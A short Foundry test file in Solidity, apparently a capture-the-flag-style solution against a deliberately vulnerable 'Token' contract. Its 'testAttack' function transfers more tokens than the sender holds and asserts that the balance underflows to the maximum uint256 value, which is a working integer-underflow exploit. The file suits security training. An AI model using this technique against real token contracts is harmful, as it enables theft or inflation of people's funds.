// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "../src/Token.sol";

contract TokenTest is Test {
    Token public c;
    address p = address(1337);
    address p2 = address(1338);

    function setUp() public {
        vm.prank(p);
        vm.deal(p, 1 ether);
        c = new Token();
    }

    /// @dev Get a large amount of tokens
    function testAttack() public {
        vm.startPrank(p);
        c.transfer(p2, 21);
        vm.stopPrank();
        assertEq(c.balanceOf(p), 2**256 - 1);
    }
}
